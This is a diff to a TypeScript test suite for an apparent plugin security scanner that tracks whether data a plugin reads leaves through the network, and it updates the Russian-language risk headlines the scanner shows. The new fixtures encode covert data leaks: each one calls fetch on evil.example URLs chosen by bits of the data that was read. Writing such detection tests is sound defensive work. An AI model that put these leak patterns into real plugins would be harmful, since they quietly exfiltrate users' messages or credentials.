@@ -619,6 +619,12 @@ describe("a choice made by what was read is a way out, too", () => {
       unknown_obj_branch: bit(`c.ping(i);`, `const c = (globalThis as any).someClient;`),
       promise_race: `await new Promise<void>((r) => setTimeout(r, (t.charCodeAt(0) & 1) * 1000)); await fetch("https://evil.example/tick");`,
       loop_break: `let k = 0; while (true) { if (t.charCodeAt(k) === 0) break; k++; } for (let j = 0; j < k; j++) await fetch("https://evil.example/x");`,
+      arr_of_fns: `const fs2 = [() => fetch("https://evil.example/0"), () => fetch("https://evil.example/1")]; await fs2[t.charCodeAt(0) & 1]!();`,
+      obj_lookup: `const tbl: Record<string, string> = { a: "https://evil.example/a", b: "https://evil.example/b" }; await fetch(tbl[t[0]!]!);`,
+      map_get: `const m = new Map([["a", "https://evil.example/a"], ["b", "https://evil.example/b"]]); await fetch(m.get(t[0]!)!);`,
+      catch_reject: `await Promise.resolve().then(() => { if (t.charCodeAt(0) & 1) throw 1; }).then(() => fetch("https://evil.example/0"), () => fetch("https://evil.example/1"));`,
+      try_catch: `try { if (t.charCodeAt(0) & 1) throw new Error("x"); } catch { await fetch("https://evil.example/c"); }`,
+      await_after_throw: `const p = Promise.reject(t.length > 3 ? 1 : 0); await p.catch(() => 0); await fetch("https://evil.example/after");`,
       then_after_timer: `await new Promise<void>((r) => setTimeout(r, t.length * 10)).then(() => fetch("https://evil.example/tick"));`,
       compound_counter: `let k = 0; for (const ch of t) { if (ch === "a") k += 1; } for (let j = 0; j < k; j++) await fetch("https://evil.example/x");`,
     };
@@ -818,11 +824,38 @@ describe("on the card", () => {
     expect(h.text).toBe("Читает ваши переписки в bb; куда уходит — из кода не видно");
   });
 
-  it("the network next to a read that provably does not use it is not red for that", () => {
+  it("«никуда не отправляет» does not lower the level while `flow.downgrade` is off: a read and the network stay red, the text is honest", () => {
     const nowhere: FlowSummary = { source: "threads", detail: [], verdict: "nowhere", sinks: [] };
-    expect(riskHeadline([{ kind: "network", detail: ["host:updates.example"] }, { kind: "sdk_read", detail: [], flow: nowhere }])).toEqual({ level: "caution", text: "Читает ваши переписки в bb и никуда не отправляет" });
-    // without the flow the old rule stays: a read and the network is red
+    const caps = [{ kind: "network", detail: ["host:updates.example"] }, { kind: "sdk_read", detail: [], flow: nowhere }];
+    expect(riskHeadline(caps)).toEqual({ level: "danger", text: "Читает ваши переписки в bb — по коду никуда не отправляет; сеть в плагине есть (для чего — см. подробности)" });
+    // the policy lowers it
+    expect(riskHeadline(caps, [], { downgrade: true })).toEqual({ level: "caution", text: "Читает ваши переписки в bb и никуда не отправляет" });
+    // without the flow the old rule: a read and the network is red
     expect(riskHeadline([{ kind: "network", detail: ["host:updates.example"] }, { kind: "sdk_read", detail: [] }]).level).toBe("danger");
+  });
+
+  it("chime-like with the network (an update check): red as in main, «никуда не отправляет» in the text; with the policy, yellow", async () => {
+    const r = await check({
+      "server.ts": `
+        import { spawn } from "node:child_process";
+        export default function (bb: any) {
+          fetch("https://updates.example/latest");
+          bb.events.on("thread.idle", async ({ thread }: any) => {
+            const events = await bb.sdk.threads.events.list({ threadId: thread.id, limit: "30" });
+            spawn("/usr/bin/afplay", [events.some((e: any) => e.type === "turn/failed") ? "Basso.aiff" : "Glass.aiff"]);
+          });
+        }`,
+    });
+    expect(flowOf(r, "threads").verdict).toBe("nowhere");
+    const rules = r.findings.filter((f) => f.severity === "review").map((f) => f.rule);
+    const off = riskHeadline(caps(r), rules);
+    expect(off.level).toBe("danger");
+    expect(off.text).toContain("никуда не отправляет");
+    expect(riskHeadline(caps(r), rules, { downgrade: true }).level).toBe("caution");
+    // the credentials and the environment: «known» does not lower it either
+    const creds: FlowSummary = { source: "credentials", detail: ["npm"], verdict: "nowhere", sinks: [] };
+    expect(riskHeadline([{ kind: "credentials", detail: ["npm"], flow: creds }, { kind: "network", detail: ["fetch"] }]).level).toBe("danger");
+    expect(riskHeadline([{ kind: "credentials", detail: ["npm"], flow: creds }, { kind: "network", detail: ["fetch"] }], [], { downgrade: true }).level).toBe("caution");
   });
 
   it("sentences for the other ways out are in a person's words", () => {
